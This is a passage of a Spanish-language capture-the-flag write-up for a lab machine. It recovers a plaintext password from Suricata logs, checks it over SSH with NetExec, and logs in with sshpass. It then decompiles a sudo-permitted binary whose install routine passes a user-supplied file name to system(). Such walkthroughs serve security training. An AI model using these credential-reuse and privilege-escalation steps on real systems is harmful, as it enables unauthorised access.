</span></span></span><span class=line><span class=cl><span class=go>/var/log/suricata/eve.json.8.gz:{&#34;timestamp&#34;:&#34;2023-09-28T17:44:48.188361+0000&#34;,&#34;flow_id&#34;:1218304978677234,&#34;in_iface&#34;:&#34;ens33&#34;,&#34;event_type&#34;:&#34;ftp&#34;,&#34;src_ip&#34;:&#34;192.168.227.229&#34;,&#34;src_port&#34;:45760,&#34;dest_ip&#34;:&#34;192.168.227.13&#34;,&#34;dest_port&#34;:21,&#34;proto&#34;:&#34;TCP&#34;,&#34;tx_id&#34;:2,&#34;community_id&#34;:&#34;1:hzLyTSoEJFiGcXoVyvk2lbJlaF0=&#34;,&#34;ftp&#34;:{&#34;command&#34;:&#34;PASS&#34;,&#34;command_data&#34;:&#34;Lopezz1992%123&#34;,&#34;completion_code&#34;:[&#34;230&#34;],&#34;reply&#34;:[&#34;Login successful.&#34;],&#34;reply_received&#34;:&#34;yes&#34;}}
</span></span></span></code></pre></div><p>donde <code>Lopezz1992%123</code> se ve como una contrase√±a.</p><p>Reviso si estas credenciales son v√°lidas por <code>SSH</code> usando la herramienta <code>NetExec</code>; y funcionan:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ netexec ssh 10.10.11.15 -u &#39;lopez&#39; -p &#39;Lopezz1992%123&#39;
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>SSH         10.10.11.15     22     10.10.11.15      [*] SSH-2.0-OpenSSH_8.9p1 Ubuntu-3ubuntu0.7
</span></span></span><span class=line><span class=cl><span class=go>SSH         10.10.11.15     22     10.10.11.15      [+] lopez:Lopezz1992%123  (non root) Linux - Shell access!
</span></span></span></code></pre></div><p>De manera que tenemos credenciales: <code>lopez:Lopezz1992%123</code>.</p><p>Me conecto entonces a trav√©s de <code>SSH</code> como este usuario:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>‚ùØ sshpass -p &#39;Lopezz1992%123&#39; ssh -o stricthostkeychecking=no lopez@10.10.11.15
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>lopez@intuition:~$ whoami
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>lopez
</span></span></span></code></pre></div><p>Reviso qu√© es lo que puede ejecutar este usuario con <code>sudo</code>:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>lopez@intuition:~$ sudo -l
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>[sudo] password for lopez:
</span></span></span><span class=line><span class=cl><span class=go>Matching Defaults entries for lopez on intuition:
</span></span></span><span class=line><span class=cl><span class=go>    env_reset, mail_badpass, secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin\:/snap/bin, use_pty
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>User lopez may run the following commands on intuition:
</span></span></span><span class=line><span class=cl><span class=go>    (ALL : ALL) /opt/runner2/runner2
</span></span></span></code></pre></div><p>Donde tenemos un archivo <code>/opt/runner2/runner2</code>. Debido a su nombre, puede que √©ste sea algo as√≠ como una segunda versi√≥n del binario <code>runner1</code> (el archivo previamente hallado en el recurso <code>FTP</code>).</p><p>Corriendo este archivo nos muestra:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-shell-session data-lang=shell-session><span class=line><span class=cl><span class=go>lopez@intuition:/opt/runner2$ ./runner2
</span></span></span><span class=line><span class=cl><span class=go></span><span class=err>
</span></span></span><span class=line><span class=cl><span class=err></span><span class=go>Usage: ./runner2 &lt;json_file&gt;
</span></span></span></code></pre></div><p>El cual parece ser levemente diferente del binario <code>runner1</code>.</p><p>Pasamos el binario <code>runner2</code> desde la m√°quina v√≠ctima a nuestra m√°quina de atacante para analizarlo. Ahora realizaremos un poco de <code>Reverse Engineering</code> con <code>Ghidra</code>. Analizando la funci√≥n <code>main</code> tenemos:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=n>undefined8</span> <span class=nf>main</span><span class=p>(</span><span class=kt>int</span> <span class=n>param_1</span><span class=p>,</span><span class=n>undefined8</span> <span class=o>*</span><span class=n>param_2</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>iVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>FILE</span> <span class=o>*</span><span class=n>__stream</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>long</span> <span class=n>lVar2</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=o>*</span><span class=n>piVar3</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=o>*</span><span class=n>piVar4</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>pcVar5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>undefined8</span> <span class=n>uVar6</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>DIR</span> <span class=o>*</span><span class=n>__dirp</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=n>dirent</span> <span class=o>*</span><span class=n>pdVar7</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>local_80</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=o>*</span><span class=n>local_78</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>param_1</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>printf</span><span class=p>(</span><span class=s>&#34;Usage: %s &lt;json_file&gt;</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=o>*</span><span class=n>param_2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>__stream</span> <span class=o>=</span> <span class=nf>fopen</span><span class=p>((</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=n>param_2</span><span class=p>[</span><span class=mi>1</span><span class=p>],</span><span class=s>&#34;r&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>__stream</span> <span class=o>==</span> <span class=p>(</span><span class=n>FILE</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;Failed to open the JSON file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>lVar2</span> <span class=o>=</span> <span class=nf>json_loadf</span><span class=p>(</span><span class=n>__stream</span><span class=p>,</span><span class=mi>2</span><span class=p>,</span><span class=mi>0</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=nf>fclose</span><span class=p>(</span><span class=n>__stream</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>lVar2</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Error parsing JSON data.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x19</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=n>piVar3</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=nf>json_object_get</span><span class=p>(</span><span class=n>lVar2</span><span class=p>,</span><span class=o>&amp;</span><span class=n>DAT_00102148</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>((</span><span class=n>piVar3</span> <span class=o>==</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=o>*</span><span class=n>piVar3</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Run key missing or invalid.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x1c</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=n>piVar4</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=nf>json_object_get</span><span class=p>(</span><span class=n>piVar3</span><span class=p>,</span><span class=s>&#34;action&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=k>if</span> <span class=p>((</span><span class=n>piVar4</span> <span class=o>==</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=o>*</span><span class=n>piVar4</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Action key missing or invalid.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x1f</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>      <span class=n>pcVar5</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=nf>json_string_value</span><span class=p>(</span><span class=n>piVar4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=n>iVar1</span> <span class=o>=</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>pcVar5</span><span class=p>,</span><span class=s>&#34;list&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=nf>listPlaybooks</span><span class=p>();</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>      <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>        <span class=n>iVar1</span> <span class=o>=</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>pcVar5</span><span class=p>,</span><span class=s>&#34;run&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>piVar3</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=nf>json_object_get</span><span class=p>(</span><span class=n>piVar3</span><span class=p>,</span><span class=o>&amp;</span><span class=n>DAT_00102158</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>piVar4</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=nf>json_object_get</span><span class=p>(</span><span class=n>lVar2</span><span class=p>,</span><span class=s>&#34;auth_code&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>((</span><span class=n>piVar4</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=o>*</span><span class=n>piVar4</span> <span class=o>==</span> <span class=mi>2</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>uVar6</span> <span class=o>=</span> <span class=nf>json_string_value</span><span class=p>(</span><span class=n>piVar4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>iVar1</span> <span class=o>=</span> <span class=nf>check_auth</span><span class=p>(</span><span class=n>uVar6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=k>if</span> <span class=p>((</span><span class=n>piVar3</span> <span class=o>==</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=o>*</span><span class=n>piVar3</span> <span class=o>!=</span> <span class=mi>3</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Invalid </span><span class=se>\&#39;</span><span class=s>num</span><span class=se>\&#39;</span><span class=s> value for </span><span class=se>\&#39;</span><span class=s>run</span><span class=se>\&#39;</span><span class=s> action.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x26</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>iVar1</span> <span class=o>=</span> <span class=nf>json_integer_value</span><span class=p>(</span><span class=n>piVar3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=n>__dirp</span> <span class=o>=</span> <span class=nf>opendir</span><span class=p>(</span><span class=s>&#34;/opt/playbooks/&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>__dirp</span> <span class=o>==</span> <span class=p>(</span><span class=n>DIR</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nf>perror</span><span class=p>(</span><span class=s>&#34;Failed to open the playbook directory&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                  <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=n>local_80</span> <span class=o>=</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=n>local_78</span> <span class=o>=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                <span class=k>while</span> <span class=p>(</span><span class=n>pdVar7</span> <span class=o>=</span> <span class=nf>readdir</span><span class=p>(</span><span class=n>__dirp</span><span class=p>),</span> <span class=n>pdVar7</span> <span class=o>!=</span> <span class=p>(</span><span class=n>dirent</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=k>if</span> <span class=p>((</span><span class=n>pdVar7</span><span class=o>-&gt;</span><span class=n>d_type</span> <span class=o>==</span> <span class=sc>&#39;\b&#39;</span><span class=p>)</span> <span class=o>&amp;&amp;</span>
</span></span><span class=line><span class=cl>                     <span class=p>(</span><span class=n>pcVar5</span> <span class=o>=</span> <span class=nf>strstr</span><span class=p>(</span><span class=n>pdVar7</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>,</span><span class=s>&#34;.yml&#34;</span><span class=p>),</span> <span class=n>pcVar5</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=k>if</span> <span class=p>(</span><span class=n>local_80</span> <span class=o>==</span> <span class=n>iVar1</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                      <span class=n>local_78</span> <span class=o>=</span> <span class=n>pdVar7</span><span class=o>-&gt;</span><span class=n>d_name</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                      <span class=k>break</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                    <span class=p>}</span>
</span></span><span class=line><span class=cl>                    <span class=n>local_80</span> <span class=o>=</span> <span class=n>local_80</span> <span class=o>+</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>                  <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=nf>closedir</span><span class=p>(</span><span class=n>__dirp</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=k>if</span> <span class=p>(</span><span class=n>local_78</span> <span class=o>==</span> <span class=p>(</span><span class=kt>char</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Invalid playbook number.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x19</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>                <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                  <span class=nf>runPlaybook</span><span class=p>(</span><span class=n>local_78</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=k>goto</span> <span class=n>LAB_00101db5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Authentication key missing or invalid for </span><span class=se>\&#39;</span><span class=s>run</span><span class=se>\&#39;</span><span class=s> action.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x38</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>json_decref</span><span class=p>(</span><span class=n>lVar2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=n>iVar1</span> <span class=o>=</span> <span class=nf>strcmp</span><span class=p>(</span><span class=n>pcVar5</span><span class=p>,</span><span class=s>&#34;install&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>        <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>          <span class=n>piVar3</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=nf>json_object_get</span><span class=p>(</span><span class=n>piVar3</span><span class=p>,</span><span class=s>&#34;role_file&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=n>piVar4</span> <span class=o>=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=nf>json_object_get</span><span class=p>(</span><span class=n>lVar2</span><span class=p>,</span><span class=s>&#34;auth_code&#34;</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=k>if</span> <span class=p>((</span><span class=n>piVar4</span> <span class=o>!=</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=o>&amp;&amp;</span> <span class=p>(</span><span class=o>*</span><span class=n>piVar4</span> <span class=o>==</span> <span class=mi>2</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>            <span class=n>uVar6</span> <span class=o>=</span> <span class=nf>json_string_value</span><span class=p>(</span><span class=n>piVar4</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=n>iVar1</span> <span class=o>=</span> <span class=nf>check_auth</span><span class=p>(</span><span class=n>uVar6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>            <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>!=</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>              <span class=k>if</span> <span class=p>((</span><span class=n>piVar3</span> <span class=o>==</span> <span class=p>(</span><span class=kt>int</span> <span class=o>*</span><span class=p>)</span><span class=mh>0x0</span><span class=p>)</span> <span class=o>||</span> <span class=p>(</span><span class=o>*</span><span class=n>piVar3</span> <span class=o>!=</span> <span class=mi>2</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Role File missing or invalid for </span><span class=se>\&#39;</span><span class=s>install</span><span class=se>\&#39;</span><span class=s> action.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x33</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                <span class=n>uVar6</span> <span class=o>=</span> <span class=nf>json_string_value</span><span class=p>(</span><span class=n>piVar3</span><span class=p>);</span>
</span></span><span class=line><span class=cl>                <span class=nf>installRole</span><span class=p>(</span><span class=n>uVar6</span><span class=p>);</span>
</span></span><span class=line><span class=cl>              <span class=p>}</span>
</span></span><span class=line><span class=cl>              <span class=k>goto</span> <span class=n>LAB_00101db5</span><span class=p>;</span>
</span></span><span class=line><span class=cl>            <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=p>}</span>
</span></span><span class=line><span class=cl>          <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Authentication key missing or invalid for </span><span class=se>\&#39;</span><span class=s>install</span><span class=se>\&#39;</span><span class=s> action.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x3c</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=nf>json_decref</span><span class=p>(</span><span class=n>lVar2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>          <span class=k>return</span> <span class=mi>1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>        <span class=p>}</span>
</span></span><span class=line><span class=cl>        <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Invalid </span><span class=se>\&#39;</span><span class=s>action</span><span class=se>\&#39;</span><span class=s> value.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x18</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>      <span class=p>}</span>
</span></span><span class=line><span class=cl>    <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl><span class=nl>LAB_00101db5</span><span class=p>:</span>
</span></span><span class=line><span class=cl>  <span class=nf>json_decref</span><span class=p>(</span><span class=n>lVar2</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span> <span class=mi>0</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p><img alt=Intuition src=/pentesting/images/Intuition_13.png></p><p>B√°sicamente, este archivo primero revisa qu√© argumento ha sido pasado al binario, o nos muestra el mensaje que se nos present√≥ cuando lo ejecutamos. Luego trata de abrir un archivo <code>JSON</code> y parsear su contenido. Luego de ello, busca por la key <code>run</code>, dentro del archivo <code>JSON</code>, y tambi√©n por la llave/par√°metro <code>action</code>. La llave <code>action</code> tiene 3 opciones: <code>list</code>, <code>run</code> o <code>install</code>. Los comandos <code>run</code> e <code>install</code> necesitan de una clave de autenticaci√≥n, la cual asumo es la misma que la del binario <code>runner1</code>. Adicionalmente, el par√°metro <code>install</code> necesita de otra key/par√°metro dentro de la key <code>run</code>, llamado <code>role_file</code> y <code>auth_code</code> (fuera de la key <code>run</code>) en el archivo <code>JSON</code>.</p><p>Del c√≥digo revertido, si pasamos un Role File, √©ste ejecuta la funci√≥n <code>installRole</code> definida en el binario como:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>installRole</span><span class=p>(</span><span class=n>undefined8</span> <span class=n>param_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>int</span> <span class=n>iVar1</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>long</span> <span class=n>in_FS_OFFSET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>local_418</span> <span class=p>[</span><span class=mi>1032</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>long</span> <span class=n>local_10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
</span></span><span class=line><span class=cl>  <span class=n>local_10</span> <span class=o>=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=n>iVar1</span> <span class=o>=</span> <span class=nf>isTarArchive</span><span class=p>(</span><span class=n>param_1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>iVar1</span> <span class=o>==</span> <span class=mi>0</span><span class=p>)</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>fwrite</span><span class=p>(</span><span class=s>&#34;Invalid tar archive.</span><span class=se>\n</span><span class=s>&#34;</span><span class=p>,</span><span class=mi>1</span><span class=p>,</span><span class=mh>0x15</span><span class=p>,</span><span class=n>stderr</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>else</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>    <span class=nf>snprintf</span><span class=p>(</span><span class=n>local_418</span><span class=p>,</span><span class=mh>0x400</span><span class=p>,</span><span class=s>&#34;%s install %s&#34;</span><span class=p>,</span><span class=s>&#34;/usr/bin/ansible-galaxy&#34;</span><span class=p>,</span><span class=n>param_1</span><span class=p>);</span>
</span></span><span class=line><span class=cl>    <span class=nf>system</span><span class=p>(</span><span class=n>local_418</span><span class=p>);</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>if</span> <span class=p>(</span><span class=n>local_10</span> <span class=o>!=</span> <span class=o>*</span><span class=p>(</span><span class=kt>long</span> <span class=o>*</span><span class=p>)(</span><span class=n>in_FS_OFFSET</span> <span class=o>+</span> <span class=mh>0x28</span><span class=p>))</span> <span class=p>{</span>
</span></span><span class=line><span class=cl>                    <span class=cm>/* WARNING: Subroutine does not return */</span>
</span></span><span class=line><span class=cl>    <span class=nf>__stack_chk_fail</span><span class=p>();</span>
</span></span><span class=line><span class=cl>  <span class=p>}</span>
</span></span><span class=line><span class=cl>  <span class=k>return</span><span class=p>;</span>
</span></span><span class=line><span class=cl><span class=p>}</span>
</span></span></code></pre></div><p>Primero, esta funci√≥n revisa que el archivo pasado sea un archivo <code>tar</code>. Si lo es, √©ste lo instala usando el binario <code>/usr/bin/ansible-galaxy</code> (<code>Ansible Galaxy</code>).</p><p>Si analizamos qu√© es lo que ocurre cuando usamos el comando <code>run</code>, el binario llama a la funci√≥n <code>runPlaybook</code> la cual es:</p><div class=highlight><pre tabindex=0 class=chroma><code class=language-c data-lang=c><span class=line><span class=cl><span class=kt>void</span> <span class=nf>runPlaybook</span><span class=p>(</span><span class=n>undefined8</span> <span class=n>param_1</span><span class=p>)</span>
</span></span><span class=line><span class=cl>
</span></span><span class=line><span class=cl><span class=p>{</span>
</span></span><span class=line><span class=cl>  <span class=kt>long</span> <span class=n>in_FS_OFFSET</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  <span class=kt>char</span> <span class=n>local_418</span> <span class=p>[</span><span class=mi>1032</span><span class=p>];</span>
</span></span><span class=line><span class=cl>  <span class=kt>long</span> <span class=n>local_10</span><span class=p>;</span>
</span></span><span class=line><span class=cl>  
